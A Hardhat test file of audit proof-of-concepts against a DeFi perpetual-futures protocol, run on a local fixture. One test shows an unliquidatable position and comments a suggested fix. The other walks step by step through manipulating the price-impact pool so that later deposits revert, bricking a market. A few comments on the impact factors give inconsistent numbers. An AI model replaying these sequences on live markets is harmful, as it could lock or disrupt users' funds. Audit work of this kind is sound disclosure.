import { expect } from "chai";

import { deployFixture } from "../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../utils/math";
import { handleDeposit } from "../../utils/deposit";
import { OrderType, handleOrder } from "../../utils/order";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../utils/adl";
import { grantRole } from "../../utils/role";
import * as keys from "../../utils/keys";
import { getPositionCount } from "../../utils/position";
import { getAccountPositionCount } from "../../utils/position";
import { time } from "@nomicfoundation/hardhat-network-helpers";
import { getPositionKeys } from "../../utils/position";
import { getOrderCount } from "../../utils/order";
import { executeLiquidation } from "../../utils/liquidation";
import { handleWithdrawal } from "../../utils/withdrawal";
import { getBalanceOf, getSupplyOf } from "../../utils/token";

describe("Guardian.PoCs", () => {
  let fixture;
  let wallet, user0, user1, user2, user3, reader;
  let roleStore, dataStore, ethUsdMarket, wnt, usdc, ethUsdSingleTokenMarket, referralStorage, exchangeRouter, errors;

  beforeEach(async () => {
    fixture = await deployFixture();
    ({ wallet, user0, user1, user2, user3 } = fixture.accounts);
    ({
      roleStore,
      dataStore,
      ethUsdMarket,
      wnt,
      usdc,
      ethUsdSingleTokenMarket,
      reader,
      referralStorage,
      exchangeRouter,
      errors,
    } = fixture.contracts);

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(1000, 9),
      },
    });
  });

  it("CRITICAL: Unliquidatable position due to unaccounted pnlAmountForPool", async () => {
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 9));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2));

    // User1 creates a short with size $200,000
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdMarket,
        initialCollateralToken: wnt,
        initialCollateralDeltaAmount: expandDecimals(10, 18),
        sizeDeltaUsd: decimalToFloat(200 * 1000),
        acceptablePrice: expandDecimals(5000, 12),
        orderType: OrderType.MarketIncrease,
        isLong: false,
      },
    });

    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
    expect(await getOrderCount(dataStore)).eq(0);

    await dataStore.setUint(keys.MIN_COLLATERAL_USD, decimalToFloat(200_000)); // Position is liquidatable
    await dataStore.setUint(keys.positionFeeFactorKey(ethUsdMarket.marketToken), decimalToFloat(5, 10));
    await dataStore.setUint(keys.POSITION_FEE_RECEIVER_FACTOR, decimalToFloat(1, 0));

    await time.increase(14 * 24 * 60 * 60);

    // The position is unable to be liquidated as the values.pnlAmountForPool
    // is overwritten in getLiquidationValues. Therefore the amount that goes into
    // the swapProfitToCollateralToken is never decremented from the poolAmount.
    // The solution is to add the following before resetting the values.pnlAmountForPool:
    //    if (values.pnlTokenForPool != params.position.collateralToken()) {
    //                MarketUtils.applyDeltaToPoolAmount(
    //                    params.contracts.dataStore,
    //                    params.contracts.eventEmitter,
    //                    params.market.marketToken,
    //                    values.pnlTokenForPool,
    //                    values.pnlAmountForPool
    //                );
    //                values.pnlTokenForPool = params.position.collateralToken();
    //    }
    //
    //    (`values.pnlTokenForPool = params.position.collateralToken()` can be moved in the if to save gas)
    await expect(
      executeLiquidation(fixture, {
        account: user1.address,
        market: ethUsdMarket,
        collateralToken: wnt,
        isLong: false,
        minPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
        maxPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
      })
    ).to.be.revertedWithCustomError(errors, "InvalidMarketTokenBalance");

    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
    expect(await getOrderCount(dataStore)).eq(0);
  });

  it.only("CRITICAL: Malicious Actor Can Brick Markets", async function () {
    const USER_1_DEPOSIT_AMOUNT = expandDecimals(100_000, 6);

    // Set price impact factors such that negative price impact is greater than positive price impact.
    // This will occur somewhat often on the exchange, but notice that a similar effect can always be engineered
    // using the virtual inventory.

    // set negative price impact to 0.5% for every $50,000 of token imbalance
    // 0.5% => 0.005
    // 0.005 / 50,000 => 1 * (10 ** -7)
    await dataStore.setUint(
      keys.positionImpactFactorKey(ethUsdSingleTokenMarket.marketToken, false),
      decimalToFloat(1, 7)
    );

    // set positive price impact to 0.01% for every $50,000 of token imbalance
    // 0.1% => 0.001
    // 0.001 / 50,000 => 1 * (2 ** -8)
    await dataStore.setUint(
      keys.positionImpactFactorKey(ethUsdSingleTokenMarket.marketToken, true),
      decimalToFloat(2, 8)
    );

    await dataStore.setUint(
      keys.positionImpactExponentFactorKey(ethUsdSingleTokenMarket.marketToken),
      decimalToFloat(2, 0)
    );

    // User 1 deposits into the market
    await handleDeposit(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        longTokenAmount: USER_1_DEPOSIT_AMOUNT,
      },
    });

    // User 1 opens a position and is negatively impacted
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(50 * 1000, 6), // $50,000
        swapPath: [],
        sizeDeltaUsd: decimalToFloat(25_000),
        acceptablePrice: expandDecimals(5010, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    // The position impact pool is non-zero
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdSingleTokenMarket.marketToken))).eq(
      "6242197253432210"
    );

    // The user closes their position and the impact pool is still non-zero
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: 0,
        swapPath: [],
        sizeDeltaUsd: decimalToFloat(25_000),
        acceptablePrice: expandDecimals(5000, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketDecrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdSingleTokenMarket.marketToken))).eq(
      "4992509675327735"
    );
    expect(await getPositionCount(dataStore)).to.eq(0);

    const user1MarketTokenBalance = await getBalanceOf(ethUsdSingleTokenMarket.marketToken, user1.address);

    // The user withdraws all of their MarketTokens and a portion is left due to the position impact pool
    await handleWithdrawal(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        marketTokenAmount: user1MarketTokenBalance,
      },
    });

    expect(await dataStore.getUint(keys.poolAmountKey(ethUsdSingleTokenMarket.marketToken, usdc.address))).eq(
      "24962551"
    );
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdSingleTokenMarket.marketToken))).eq(
      "4992509675327735"
    );

    // Now the user can open another position and becomes negatively impacted again
    await handleOrder(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        initialCollateralToken: usdc,
        initialCollateralDeltaAmount: expandDecimals(5 * 1000, 6),
        swapPath: [],
        sizeDeltaUsd: expandDecimals(6, 30),
        acceptablePrice: expandDecimals(5001, 12),
        executionFee: expandDecimals(1, 15),
        minOutputAmount: 0,
        orderType: OrderType.MarketIncrease,
        isLong: true,
        shouldUnwrapNativeToken: false,
      },
    });

    expect(await getPositionCount(dataStore)).to.eq(1);

    expect(await dataStore.getUint(keys.poolAmountKey(ethUsdSingleTokenMarket.marketToken, usdc.address))).eq(
      "24962551"
    );
    expect(await dataStore.getUint(keys.positionImpactPoolAmountKey(ethUsdSingleTokenMarket.marketToken))).gt(
      "4992509675327735"
    );

    // Underflow revert occurs when anyone attempts to deposit now since the getPoolValueInfo function will
    // attempt to subtract the larger impact pool value from the smaller poolAmount value.
    // The underflow occurs no matter what the PnL of the position is since this subtraction takes place before the
    // PnL is added to the poolValue.
    await handleDeposit(fixture, {
      create: {
        account: user1,
        market: ethUsdSingleTokenMarket,
        longTokenAmount: USER_1_DEPOSIT_AMOUNT,
      },
    });
  });
});
